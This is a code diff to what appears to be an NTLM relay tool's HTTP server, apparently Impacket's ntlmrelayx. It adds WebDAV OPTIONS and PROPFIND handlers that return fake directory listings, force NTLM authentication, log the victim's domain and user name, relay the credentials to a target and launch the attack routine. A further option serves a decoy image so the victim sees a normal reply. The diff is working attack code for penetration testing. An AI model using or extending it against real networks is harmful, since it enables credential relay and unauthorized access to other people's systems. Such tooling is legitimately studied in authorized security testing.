@@ -106,10 +106,74 @@ class HTTPRelayServer(Thread):
             else:
                 return False
 
+        def serve_image(self):
+            with open(self.server.config.serve_image, 'r+') as imgFile:
+                imgFile_data = imgFile.read()
+                self.send_response(200, "OK")
+                self.send_header('Content-type', 'image/jpeg')
+                self.send_header('Content-Length', str(len(imgFile_data)))
+                self.end_headers()
+                self.wfile.write(imgFile_data)
+
         def do_HEAD(self):
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
+
+        def do_OPTIONS(self):
+            self.send_response(200)
+            self.send_header('Allow',
+                             'GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY')
+            self.send_header('Content-Length', '0')
+            self.send_header('Connection', 'close')
+            self.end_headers()
+            return
+
+        def do_PROPFIND(self):
+            proxy = False
+            if (".jpg" in self.path) or (".JPG" in self.path):
+                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+            else:
+                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+
+            messageType = 0
+            if self.headers.getheader('Authorization') is None:
+                self.do_AUTHHEAD(message='NTLM')
+                pass
+            else:
+                typeX = self.headers.getheader('Authorization')
+                try:
+                    _, blob = typeX.split('NTLM')
+                    token = base64.b64decode(blob.strip())
+                except:
+                    self.do_AUTHHEAD()
+                messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]
+
+            if messageType == 1:
+                if not self.do_ntlm_negotiate(token, proxy=proxy):
+                    LOG.info("do negotiate failed, sending redirect")
+                    self.do_REDIRECT()
+            elif messageType == 3:
+                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
+                authenticateMessage.fromString(token)
+                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                        authenticateMessage['user_name'].decode('utf-16le')))
+                else:
+                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                        authenticateMessage['user_name'].decode('ascii')))
+                self.do_ntlm_auth(token, authenticateMessage)
+                self.do_attack()
+
+
+                self.send_response(207, "Multi-Status")
+                self.send_header('Content-Type', 'application/xml')
+                self.send_header('Content-Length', str(len(content)))
+                self.end_headers()
+                self.wfile.write(content)
+                return
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
@@ -249,6 +313,11 @@ class HTTPRelayServer(Thread):
                     self.server.config.target.logTarget(self.target, True, self.authUser)
 
                     self.do_attack()
+
+                    # Serve image and return 200 if --serve-image option has been set by user
+                    if (self.server.config.serve_image):
+                        self.serve_image()
+                        return
 
                     # And answer 404 not found
                     self.send_response(404)
